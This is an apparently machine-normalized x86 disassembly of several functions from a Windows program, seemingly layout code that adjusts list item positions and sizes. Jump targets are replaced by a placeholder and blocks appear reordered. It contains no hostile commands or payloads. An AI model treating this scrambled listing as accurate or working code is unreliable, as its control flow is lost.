mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x84 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x84 ]
add eax 0x4
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x84 ]
mov eax [ eax + 0x3d ]
add eax [ ebx + 0x24 ]
mov edx [ ebp - 0x88 ]
sub eax [ edx + 0xc ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x84 ]
mov ecx [ eax + 0x39 ]
mov eax [ ebp - 0x84 ]
add ecx [ eax + 0x44 ]
mov eax [ ebp - 0x88 ]
sub ecx [ eax + 0x8 ]
mov eax [ ebp - 0x88 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x84 ]
add edx [ eax + 0x3d ]
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
mov ebx [ ebp - 0x84 ]
add eax [ ebx + 0x39 ]
call sub_416a60
mov eax [ ebp - 0x84 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x98 ]
jne r-xdata
mov eax [ esi + 0x24 ]
add [ ebp - 0x8c ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x41 ] 0x0
cmp [ ebp - 0x41 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov [ ebp - 0x56 ] 0x1
lea edx [ ebp - 0x98 ]
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
call sub_43f570
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x94 ]
jne r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x1a ] eax
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x3d ] eax
jmp r-xdata
mov [ ebp - 0x41 ] 0x0
mov edx [ ebp - 0x14 ]
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
call sub_417e94
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x98 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x94 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x4c ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x16 ]
mov [ ebx + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ ebx + 0x1a ] edx
mov edx [ eax + 0x39 ]
mov [ ebx + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ ebx + 0x3d ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x1a ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x3d ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov eax [ eax + 0x44 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_416a88
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
sub [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebx + 0x28 ]
push eax
lea ecx [ ebx + 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0x68 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x54 ]
jge r-xdata
mov [ ebp - 0x78 ] ebx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x16 ] edx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x1a ] edx
mov eax ebx
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x39 ] edx
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp - 0xa0 ]
sub edx [ ebp - 0xa8 ]
mov [ eax + 0x44 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebx + 0x3d ]
mov [ ebp - 0x38 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_416a88
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_416a88
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp eax [ ebp - 0x54 ]
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0xa8 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebp - 0x41 ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x54 ]
call sub_417e94
mov ebx eax
xor eax eax
mov [ ebx + 0x39 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x38 ] 0x1
inc [ ebp - 0x4c ]
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42d1b0
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x44 ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
cmp eax [ ebx + 0x44 ]
jle r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x28 ]
sub [ ebx + 0x39 ] eax
mov eax [ ebx + 0x44 ]
sub [ ebp - 0x1c ] eax
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42d1b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov edi [ ebp - 0x14 ]
dec edi
mov eax [ ebp - 0x50 ]
sub eax edi
jg r-xdata
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax [ ebx + 0x16 ]
call sub_416a88
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x10 ]
sub edx [ eax + 0x4 ]
sub edx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x10 ]
sub eax [ ecx ]
sub eax [ ebx + 0x4 ]
lea ecx [ ebp - 0xb0 ]
call sub_416a38
mov eax [ ebp - 0xb0 ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0xac ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_416a88
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_417e94
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x14 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x44 ] eax
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
dec eax
mov [ ebp - 0x7c ] eax
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42d1b0
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x39 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebx + 0x39 ]
jle r-xdata
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x20 ]
add [ ebp - 0x24 ] eax
add eax [ ebp - 0x40 ]
add [ ebp - 0x20 ] eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
cmp eax [ ebp - 0x5c ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebx + 0x39 ] eax
push ebp
lea edx [ ebp - 0x3c ]
mov ecx [ ebp - 0x40 ]
mov eax ebx
call sub_42d1b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
dec eax
cmp edi eax
jge r-xdata
dec edi
inc [ ebp - 0x7c ]
jne r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x1a ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x20 ]
mov [ eax + 0x20 ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0x39 ] edx
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x44 ]
sub [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov esi eax
push ebp
mov ecx [ esi + 0x44 ]
lea edx [ esi + 0x39 ]
mov eax esi
call sub_42d1b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebp - 0x80 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov edx [ eax + 0x16 ]
mov [ esi + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ esi + 0x1a ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov edx [ eax + 0x39 ]
mov [ esi + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ esi + 0x3d ] edx
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x1a ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x3d ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_417e94
mov eax [ eax + 0x44 ]
mov [ esi + 0x44 ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
sub_42dd2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417d38
inc edi
xor esi esi
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_417f10
jmp r-xdata
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
dec edi
jne r-xdata
mov edx [ ebx + 0x40 ]
cmp edx [ eax + 0x40 ]
jge r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jl r-xdata
sub_42dd8c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x35 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x34 ] eax
xor edx edx
push ebp
push sub_42e139
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_4430fc
mov edx eax
mov eax [ ebp - 0x20 ]
call sub_418050
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x21 ] 0x0
mov eax ebx
call sub_4430fc
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
mov al 0x1
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x1
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42e4c8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_417e94
lea edx [ ebp - 0x5c ]
call sub_43f550
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_417e94
mov edx eax
lea ecx [ ebp - 0x5c ]
mov eax ebx
call sub_42e4c8
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
setne al
and al [ ebp - 0x19 ]
je r-xdata
inc edi
xor esi esi
xor eax eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e140
mov eax [ ebp - 0x20 ]
call sub_40316c
mov eax [ ebp - 0x2c ]
call sub_40316c
mov eax [ ebp - 0x30 ]
call sub_40316c
mov eax [ ebp - 0x34 ]
call sub_40316c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_417e94
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x22 ] al
mov [ ebp - 0x19 ] 0x0
mov eax [ ebx + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov edi [ ebx + 0x228 ]
mov eax edi
mov edx esi
call sub_417e94
mov edx eax
mov eax edi
call sub_42d01c
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_417e94
cmp [ eax + 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_417e94
mov [ ebp - 0x28 ] eax
mov edi [ ebp - 0x28 ]
mov edx [ edi + 0x8 ]
add edx [ edi + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_417d38
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_417e94
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4430c0
mov [ ebp - 0x18 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
call sub_42dd2c
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x4c ]
mov eax [ edi ]
call sub_43f550
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
mov edx [ edi ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ edi + 0x16 ]
add ecx [ edi + 0x20 ]
sub ecx [ edi + 0xc ]
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x16 ]
add eax [ edi + 0x4 ]
pop edx
call sub_416a60
jmp r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov dl [ ebp - 0x11 ]
mov eax [ ebp - 0x2c ]
call sub_417d38
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_417d38
mov eax [ ebp - 0x28 ]
mov edi [ eax + 0x34 ]
test edi edi
je r-xdata
lea eax [ esi + 0x1 ]
mov edx [ ebx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov al [ edi + 0x15 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp al [ ebp - 0x22 ]
setne [ ebp - 0x21 ]
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_417e94
mov dl [ ebp - 0x22 ]
mov [ eax + 0x14 ] dl
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx [ ebp - 0x28 ]
call sub_42d01c
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx edi
call sub_417ef0
mov esi eax
xor edx edx
mov dl [ edi + 0x15 ]
mov eax [ ebp - 0x2c ]
call sub_417d38
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_417d38
mov eax edi
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_417d38
cmp [ edi + 0x15 ] 0x0
je r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_417e94
mov edi eax
cmp [ edi + 0x15 ] 0x0
jne r-xdata
mov edi [ edi + 0x34 ]
test edi edi
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov [ edi + 0x15 ] 0x1
mov [ edi + 0x38 ] 0x1
mov [ ebp - 0x35 ] 0x1
lea edx [ esi + 0x1 ]
call sub_417e94
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x15 ] 0x1
sub_42e170
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp eax
mov eax [ ebp + 0x228 ]
